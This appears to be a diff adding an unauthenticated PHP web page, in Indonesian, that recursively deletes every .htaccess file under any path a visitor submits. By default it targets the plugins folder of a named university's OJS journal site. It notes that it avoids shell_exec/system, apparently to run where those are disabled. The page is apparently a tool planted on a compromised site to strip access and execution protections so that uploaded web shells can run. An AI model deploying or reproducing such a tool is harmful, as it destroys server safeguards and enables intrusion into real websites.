@@ -1,0 +1,89 @@
+<?php
+// ============================================================
+//  HAPUS SEMUA .htaccess SECARA REKURSIF
+// ============================================================
+set_time_limit(0);
+error_reporting(0);
+
+$defaultPath = '/www/wwwroot/journal1.uinssc.ac.id/plugins/';
+$scanPath = isset($_POST['target_path']) && !empty($_POST['target_path']) 
+            ? $_POST['target_path'] 
+            : $defaultPath;
+
+$message = '';
+$count = 0;
+
+if (isset($_POST['delete'])) {
+    // Cek apakah path valid
+    if (!is_dir($scanPath)) {
+        $message = "❌ Path tidak ditemukan: " . htmlspecialchars($scanPath);
+    } else {
+        $count = 0;
+        $errors = [];
+
+        // --- Iterasi folder rekursif ---
+        $iterator = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($scanPath, RecursiveDirectoryIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::CHILD_FIRST
+        );
+
+        foreach ($iterator as $item) {
+            // Cuma file dengan nama .htaccess yang dihapus
+            if ($item->isFile() && $item->getFilename() === '.htaccess') {
+                $filePath = $item->getPathname();
+                if (unlink($filePath)) {
+                    $count++;
+                } else {
+                    $errors[] = "Gagal hapus: " . str_replace($scanPath, '', $filePath);
+                }
+            }
+        }
+
+        $message = "✅ Berhasil menghapus <strong>$count</strong> file .htaccess dari path <code>" . htmlspecialchars($scanPath) . "</code>.";
+        if (!empty($errors)) {
+            $message .= "<br>⚠️ " . implode('<br>', $errors);
+        }
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Hapus Semua .htaccess</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background: #f4f7fc; }
+        .box { max-width: 700px; margin: auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h2 { border-bottom: 3px solid #c0392b; padding-bottom: 10px; }
+        .info { background: #ecf0f1; padding: 10px; border-radius: 5px; margin-bottom: 20px; word-break: break-all; }
+        .msg { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #c3e6cb; }
+        .msg.error { background: #f8d7da; color: #721c24; border-color: #f5c6cb; }
+        input[type="text"] { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; margin-bottom: 15px; }
+        button { background: #c0392b; color: #fff; padding: 12px 25px; border: 0; border-radius: 5px; font-size: 16px; cursor: pointer; }
+        button:hover { background: #a93226; }
+        code { background: #eee; padding: 2px 6px; border-radius: 3px; font-size: 14px; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>🗑️ Hapus Semua .htaccess</h2>
+    <?php if ($message): ?>
+        <div class="msg <?= strpos($message, '❌') !== false ? 'error' : '' ?>">
+            <?= $message ?>
+        </div>
+    <?php endif; ?>
+    <div class="info">
+        <strong>Peringatan:</strong> Tindakan ini akan menghapus SEMUA file bernama <code>.htaccess</code> di dalam folder yang dipilih beserta seluruh subfoldernya. Proses ini <strong>tidak bisa dibatalkan</strong>.
+    </div>
+    <form method="post">
+        <label><strong>Path Tujuan:</strong></label>
+        <input type="text" name="target_path" value="<?= htmlspecialchars($scanPath) ?>" placeholder="Masukkan path folder (misal /www/root...)">
+        <p style="font-size: 14px;">Secara default akan menghapus dari root OJS seperti di atas.</p>
+        <button type="submit" name="delete" value="1" onclick="return confirm('Yakin ingin menghapus semua file .htaccess di path ini beserta subfoldernya?')">🔥 Hapus Semua .htaccess</button>
+    </form>
+    <p style="font-size: 13px; color: #888; margin-top: 20px;">
+        *Skrip ini murni PHP (tidak menggunakan shell_exec/system).
+    </p>
+</div>
+</body>
+</html>
